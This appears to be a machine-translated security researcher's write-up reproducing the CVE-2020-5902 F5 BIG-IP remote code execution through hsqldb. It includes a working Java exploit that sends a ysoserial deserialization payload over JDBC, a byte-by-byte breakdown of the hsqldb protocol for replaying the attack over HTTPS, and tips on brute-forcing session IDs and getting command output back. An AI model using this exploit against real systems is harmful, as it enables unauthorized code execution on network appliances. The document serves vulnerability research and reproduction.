F5 BIG-IP has recently suffered a serious RCE vulnerability. The main public
entrypoint is the tmsh and hsqldb. There are many uses and analysis of tmsh.
If you have reproduced the use of tmsh, you should know that this place is
used. Some tasteless, tmsh will not be analyzed later, mainly look at the use
of hsqldb. The use of hsqldb [poc](https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902) has been published, but the https of java
hsqldb has been unable to reproduce, try There is no way to do it in various
ways, so I have to change other ideas. The following records the process of
recurrence and stepping on the pit.
#### Use the source code to build an hsqldb http servlet
If you have debugged hsqldb, you should know that the code of hsqldb.jar
cannot be debugged with a breakpoint. This is because the linenumber table
information of the class in hsqldb is gone. The linenumber table is only used
for debugging. There is nothing for the normal running of the code.
influences. See the difference between the normally compiled class and the
lineumber table of the hqldb class:
Use the `javap -verbose hsqlServlet.class` command to see the details of the
hsqlServlet.class class in hsqldb:

We can see that in the class you compiled, each method has a LineNumberTable.
This information is used for debugging, but there is no such information in
hsqldb, so it is impossible to debug breakpoints. hsqldb should add some
parameters during compilation or use other ways to remove this information.
No way to debug is a very uncomfortable thing, I think of two now to debug:
  1. Decompile the code of hsqldb and recompile it by yourself, so that there is linenumber information, but decompilation and recompilation may encounter some error problems. This part has to manually correct the code manually, which is indeed feasible. This way can be seen in the hsqldb analysis of f5
  2. Open source code, run directly with source code
The code of hsqldb happens to be open source, so let's start a servlet
directly with the source code.
**Environment** :
  * The hsqldb source code is 1.8, and the new version is now 2.5.x. To match the hsqldb in f5, use the 1.8 code.
  * JDK7u21, JDK7 used in F5 BIG-IP version 14, so try to match it to avoid various problems.
Although it is open source, there are still some problems when dragging to
idea. I modified some codes to let him run normally. The modified code is put
in [github](https://github.com/longofo/hsqldb-source) on, the final project
structure is as follows:
Use http to exploit the hsqldb vulnerability (ysoserial cc6, many other chains
are also acceptable):
    public static void testLocal() throws IOException, ClassNotFoundException, SQLException {
            String url = "http://localhost:8080";
            String payload = Hex.encodeHexString(Files.readAllBytes(Paths.get("calc.ser")));
            System.out.println(payload);
            String dburl = "jdbc:hsqldb:" + url + "/hsqldb_war_exploded/hsqldb/";
            Class.forName("org.hsqldb.jdbcDriver");
            Connection connection = DriverManager.getConnection(dburl, "sa", "");
            Statement statement = connection.createStatement();
            statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
            statement.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload + "');");
        }

#### Use requests to send packets to simulate hsqldb RCE
The java hsqldb https problem cannot be solved, then use requests to send
https packages, first simulate the http package. Grab the payload package sent
using the java code above, a total of three packages were sent, the first is
the connection package, which is connected to the hsqldb database, and the
second and third packages are the packages that execute the statement:

According to the code, look at the specific information returned by the first
data packet. The main read and write information is handled by the Result
class, which is 20 bytes in total:
  * 1~4: total length 00000014, a total of 20 bytes
  * 5~8: mode, connection is ResultConstants.UPDATECOUNT, is 1, 00000001
  * 9~12: databaseID, if the default configuration is directly like the above, databaseID will not be assigned on the server side, initialized by jdk to 0, 00000000
  * 13~16: sessionID, this value is the value assigned by DatabaseManager.newSession, each connection is a new value, this time is 00000003
  * 17~20: for connection, it is updateCount. Note the max rows (out) or update count (in) written above. If the default configuration is as above, updateCount will not be assigned on the server side, initialized by jdk to 0, 00000000
After the analysis of the connection information is completed, the next packet
will definitely use the information of the first returned packet and attach it
to the subsequent sending packet. Here only the second sending packet is
analyzed, and the third packet is the same as the second one. , Are all
packages that execute statements:
  * 1~4: The total length is 00000082, here is 130
  * 5~8: mode, here is ResultConstants.SQLEXECDIRECT, 0001000b
  * 9~12: databaseID, which is 00000000 above
  * 13~16: sessionID, which is 00000003 above
  * 17~20: updateCount, which is 00000000 above
  * 21~25: statementID, this is sent by the client, in fact it does not matter, this time is 00000000
  * 26~30: Length of execution statement
  * 31~: All statements are executed later
It can be seen that the above processing process is very simple. Through this
analysis, it is easy to send requests using requests. For https, just set
verify=False.
#### Deserialize the trigger position
The trigger position of deserialization here is:
In fact, it is not caused by org.hsqldb.util.ScriptTool.main, but by the
deserialization caused by the parsing of the syntax of the hsqldb parser. Just
change the ScriptTool to another one, for example,
`org.hsqldb.sample.FindFile.main` is also ok.
#### F5 BIG-IP hsqldb debugging
If you still want to debug the F5 BIG-IP hsqldb, it is also possible. The
hsqldb in the F5 BIG-IP adds some code itself, decompiles his code, then
corrects the decompiled code error, and then repackages it. It can be
debugged.
#### F5 BIG-IP hsqldb echo
  * Since it can be deserialized, it can be written to the response using the template-related utilization chain
  * Use the command to find the fd file of the socket and write it to the socket
  * This time, there is already a fileRead.jsp, and you can write command result to /tmp，then use fileRead.jsp to read it.
#### Hsqldb connection security risks
As can be seen from the data packet, hsqldb does not return much information
for the first time. The additional information used later is databaseID,
sessionID, updateCount, which are only 4 bytes (32 bits), but there are always
small numbers The connection is ranked first, so you can blast out the
available databaseID, sessionID, updateCount. However, for this F5 BIG-IP,
just use the default above, without blasting.
#### Sum up
Although I didn’t write much, it seemed quite easy after writing, but the
process was actually some difficult. At the beginning, I didn’t look at the
package based on the code. I just sent a few packages for comparison and then
wrote a script, but I couldn’t run on F5 BIG-IP hsqldb, the F5 hsqldb code is
still debugged later, and many problems I have solved. At the same time, I
also saw that there are certain security risks in hsqldb. If we directly blast
databaseID, sessionID, updateCount, it is may be easy to blast out the
available databaseID, sessionID, updateCount.
